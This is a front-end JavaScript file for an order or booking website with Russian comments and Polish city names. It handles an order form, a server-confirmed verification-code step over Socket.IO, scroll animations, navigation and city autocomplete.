// Инициализация Socket.IO
const socket = io();

// Модальные окна
const orderModal = document.getElementById('orderModal');
const loadingModal = document.getElementById('loadingModal');
const codeModal = document.getElementById('codeModal');
const thanksModal = document.getElementById('thanksModal');

// Кнопки и формы
const orderBtn = document.getElementById('orderBtn');
const orderForm = document.getElementById('orderForm');
const codeForm = document.getElementById('codeForm');
const closeBtn = document.querySelector('.close');

let currentOrderId = null;

// Открытие модального окна заказа
orderBtn.addEventListener('click', () => {
    orderModal.style.display = 'block';
});

// Закрытие модального окна
closeBtn.addEventListener('click', () => {
    orderModal.style.display = 'none';
});

// Закрытие при клике вне окна
window.addEventListener('click', (e) => {
    if (e.target === orderModal) {
        orderModal.style.display = 'none';
    }
});

// Отправка заказа
orderForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const formData = new FormData(orderForm);
    const orderData = {
        customerName: formData.get('customerName'),
        customerPhone: formData.get('customerPhone'),
        customerEmail: formData.get('customerEmail'),
        orderDetails: formData.get('orderDetails')
    };

    try {
        const response = await fetch('/api/order', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(orderData)
        });

        const result = await response.json();
        
        if (result.success) {
            currentOrderId = result.orderId;
            orderModal.style.display = 'none';
            loadingModal.style.display = 'block';
        } else {
            alert('Ошибка при отправке заказа. Попробуйте еще раз.');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Ошибка при отправке заказа. Попробуйте еще раз.');
    }
});

// Отправка кода подтверждения
codeForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const formData = new FormData(codeForm);
    const code = formData.get('confirmationCode');

    try {
        const response = await fetch('/api/verify-code', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ 
                orderId: currentOrderId, 
                code: code 
            })
        });

        const result = await response.json();
        
        if (result.success) {
            codeModal.style.display = 'none';
            thanksModal.style.display = 'block';
        } else {
            alert('Неверный код подтверждения. Попробуйте еще раз.');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Ошибка при проверке кода. Попробуйте еще раз.');
    }
});

// Обработка событий от сервера через WebSocket
socket.on('orderConfirmed', (data) => {
    if (data.orderId === currentOrderId) {
        loadingModal.style.display = 'none';
        codeModal.style.display = 'block';
    }
});

socket.on('orderRejected', (data) => {
    if (data.orderId === currentOrderId) {
        loadingModal.style.display = 'none';
        alert('Ваш заказ был отклонен. Пожалуйста, свяжитесь с нами для уточнения деталей.');
    }
});

// Анимация загрузки
function showLoadingModal() {
    loadingModal.style.display = 'block';
}

function hideLoadingModal() {
    loadingModal.style.display = 'none';
}

// Уведомление о подключении
socket.on('connect', () => {
    console.log('Connected to server');
});

socket.on('disconnect', () => {
    console.log('Disconnected from server');
});

// ========== Анимации при прокрутке ==========

// Функция для проверки видимости элемента
function isElementInViewport(el) {
    const rect = el.getBoundingClientRect();
    const windowHeight = window.innerHeight || document.documentElement.clientHeight;
    
    return (
        rect.top <= windowHeight * 0.85 &&
        rect.bottom >= 0 &&
        rect.left >= 0 &&
        rect.right <= (window.innerWidth || document.documentElement.clientWidth)
    );
}

// Функция для анимации элементов при появлении в зоне видимости
function animateOnScroll() {
    const elements = document.querySelectorAll('.scroll-animate');
    
    elements.forEach(element => {
        if (isElementInViewport(element)) {
            element.classList.add('animate');
        }
    });
}

// Инициализация анимаций при загрузке страницы
function initScrollAnimations() {
    // Сначала проверяем элементы, которые уже в зоне видимости
    animateOnScroll();
    
    // Добавляем обработчик события прокрутки с throttling
    let ticking = false;
    
    function scrollHandler() {
        if (!ticking) {
            requestAnimationFrame(() => {
                animateOnScroll();
                ticking = false;
            });
            ticking = true;
        }
    }
    
    window.addEventListener('scroll', scrollHandler, { passive: true });
    window.addEventListener('resize', animateOnScroll, { passive: true });
}

// Инициализация навигации
function initNavigation() {
    const navbar = document.querySelector('.navbar');
    const navLinks = document.querySelectorAll('.nav-link');
    
    // Добавление класса при прокрутке
    window.addEventListener('scroll', () => {
        if (window.scrollY > 50) {
            navbar.classList.add('scrolled');
        } else {
            navbar.classList.remove('scrolled');
        }
    }, { passive: true });
    
    // Плавная прокрутка для навигационных ссылок
    navLinks.forEach(link => {
        link.addEventListener('click', (e) => {
            const href = link.getAttribute('href');
            if (href && href.startsWith('#')) {
                e.preventDefault();
                const targetId = href.substring(1);
                const targetElement = document.getElementById(targetId);
                
                if (targetElement) {
                    const offsetTop = targetElement.offsetTop - 80; // Учитываем высоту навбара
                    
                    window.scrollTo({
                        top: offsetTop,
                        behavior: 'smooth'
                    });
                    
                    // Обновляем активный класс
                    navLinks.forEach(l => l.classList.remove('active'));
                    link.classList.add('active');
                }
            }
        });
    });
}

// Функция для добавления микро-взаимодействий
function initMicroInteractions() {
    // Анимация кнопок при клике
    const buttons = document.querySelectorAll('button, .btn');
    
    buttons.forEach(button => {
        button.addEventListener('click', function(e) {
            // Создаем эффект ripple
            const ripple = document.createElement('span');
            const rect = this.getBoundingClientRect();
            const size = Math.max(rect.width, rect.height);
            const x = e.clientX - rect.left - size / 2;
            const y = e.clientY - rect.top - size / 2;
            
            ripple.style.width = ripple.style.height = size + 'px';
            ripple.style.left = x + 'px';
            ripple.style.top = y + 'px';
            ripple.classList.add('ripple-effect');
            
            this.appendChild(ripple);
            
            // Удаляем эффект через 600ms
            setTimeout(() => {
                if (ripple.parentNode) {
                    ripple.parentNode.removeChild(ripple);
                }
            }, 600);
        });
    });
}

// ========== Автодополнение городов ==========

// База данных популярных городов Польши
const polishCities = [
    { name: 'Warszawa', country: 'Polska', popular: true },
    { name: 'Kraków', country: 'Polska', popular: true },
    { name: 'Gdańsk', country: 'Polska', popular: true },
    { name: 'Wrocław', country: 'Polska', popular: true },
    { name: 'Poznań', country: 'Polska', popular: true },
    { name: 'Łódź', country: 'Polska', popular: true },
    { name: 'Szczecin', country: 'Polska', popular: true },
    { name: 'Lublin', country: 'Polska', popular: true },
    { name: 'Katowice', country: 'Polska', popular: true },
    { name: 'Bydgoszcz', country: 'Polska', popular: true },
    { name: 'Białystok', country: 'Polska', popular: false },
    { name: 'Olsztyn', country: 'Polska', popular: false },
    { name: 'Rzeszów', country: 'Polska', popular: false },
    { name: 'Toruń', country: 'Polska', popular: false },
    { name: 'Kielce', country: 'Polska', popular: false },
    { name: 'Opole', country: 'Polska', popular: false },
    { name: 'Zielona Góra', country: 'Polska', popular: false },
    { name: 'Częstochowa', country: 'Polska', popular: false },
    { name: 'Radom', country: 'Polska', popular: false },
    { name: 'Sosnowiec', country: 'Polska', popular: false },
    // Популярные европейские направления
    { name: 'Berlin', country: 'Niemcy', popular: true },
    { name: 'Praha', country: 'Czechy', popular: true },
    { name: 'Wiedeń', country: 'Austria', popular: true },
    { name: 'Budapeszt', country: 'Węgry', popular: true },
    { name: 'Amsterdam', country: 'Holandia', popular: true },
    { name: 'Paryż', country: 'Francja', popular: true },
    { name: 'Londyn', country: 'Wielka Brytania', popular: true },
    { name: 'Bruksela', country: 'Belgia', popular: true }
];

// Функция для создания автодополнения
function createAutocomplete(inputElement) {
    const wrapper = inputElement.closest('.input-wrapper');
    let dropdown = wrapper.querySelector('.autocomplete-dropdown');
    
    // Создаем dropdown если его нет
    if (!dropdown) {
        dropdown = document.createElement('div');
        dropdown.className = 'autocomplete-dropdown';
        wrapper.appendChild(dropdown);
    }
    
    // Функция для фильтрации городов
    function filterCities(query) {
        if (!query || query.length === 0) {
            // Показываем популярные города при пустом запросе
            return polishCities.filter(city => city.popular).slice(0, 8);
        }
        
        const lowerQuery = query.toLowerCase();
        return polishCities
            .filter(city => city.name.toLowerCase().includes(lowerQuery))
            .sort((a, b) => {
                // Сначала точные совпадения
                const aStartsWith = a.name.toLowerCase().startsWith(lowerQuery);
                const bStartsWith = b.name.toLowerCase().startsWith(lowerQuery);
                if (aStartsWith && !bStartsWith) return -1;
                if (!aStartsWith && bStartsWith) return 1;
                
                // Затем популярные
                if (a.popular && !b.popular) return -1;
                if (!a.popular && b.popular) return 1;
                
                return 0;
            })
            .slice(0, 6);
    }
    
    // Функция для отображения результатов
    function showResults(cities) {
        dropdown.innerHTML = '';
        
        if (cities.length === 0) {
            dropdown.style.display = 'none';
            return;
        }
        
        cities.forEach((city, index) => {
            const item = document.createElement('div');
            item.className = 'autocomplete-item';
            item.innerHTML = `
                <div class="city-info">
                    <span class="city-name">${city.name}</span>
                    <span class="city-country">${city.country}</span>
                </div>
                ${city.popular ? '<div class="popular-badge">🔥</div>' : ''}
            `;
            
            // Обработчик клика
            item.addEventListener('click', () => {
                inputElement.value = city.name;
                dropdown.style.display = 'none';
                inputElement.focus();
            });
            
            dropdown.appendChild(item);
        });
        
        dropdown.style.display = 'block';
        
        // Анимация появления
        requestAnimationFrame(() => {
            dropdown.classList.add('show');
        });
    }
    
    // Обработчики событий
    inputElement.addEventListener('focus', () => {
        const query = inputElement.value;
        const cities = filterCities(query);
        showResults(cities);
    });
    
    inputElement.addEventListener('input', (e) => {
        const query = e.target.value;
        const cities = filterCities(query);
        showResults(cities);
    });
    
    // Закрытие при клике вне элемента
    document.addEventListener('click', (e) => {
        if (!wrapper.contains(e.target)) {
            dropdown.style.display = 'none';
            dropdown.classList.remove('show');
        }
    });
    
    // Обработка клавиш
    inputElement.addEventListener('keydown', (e) => {
        const items = dropdown.querySelectorAll('.autocomplete-item');
        const activeItem = dropdown.querySelector('.autocomplete-item.active');
        let currentIndex = -1;
        
        if (activeItem) {
            currentIndex = Array.from(items).indexOf(activeItem);
        }
        
        switch (e.key) {
            case 'ArrowDown':
                e.preventDefault();
                const nextIndex = currentIndex < items.length - 1 ? currentIndex + 1 : 0;
                updateActiveItem(items, nextIndex);
                break;
                
            case 'ArrowUp':
                e.preventDefault();
                const prevIndex = currentIndex > 0 ? currentIndex - 1 : items.length - 1;
                updateActiveItem(items, prevIndex);
                break;
                
            case 'Enter':
                e.preventDefault();
                if (activeItem) {
                    activeItem.click();
                }
                break;
                
            case 'Escape':
                dropdown.style.display = 'none';
                dropdown.classList.remove('show');
                inputElement.blur();
                break;
        }
    });
    
    function updateActiveItem(items, index) {
        items.forEach(item => item.classList.remove('active'));
        if (items[index]) {
            items[index].classList.add('active');
        }
    }
}

// Инициализация автодополнения для полей городов
function initCityAutocomplete() {
    const cityInputs = document.querySelectorAll('.form-input[placeholder*="Miasto"]');
    cityInputs.forEach(input => {
        createAutocomplete(input);
    });
}

// Инициализация всех функций при загрузке DOM
document.addEventListener('DOMContentLoaded', () => {
    initScrollAnimations();
    initNavigation();
    initMicroInteractions();
    initCityAutocomplete();
    
    console.log('🎨 Анимации и взаимодействия инициализированы');
    console.log('🏙️ Автодополнение городов активировано');
});
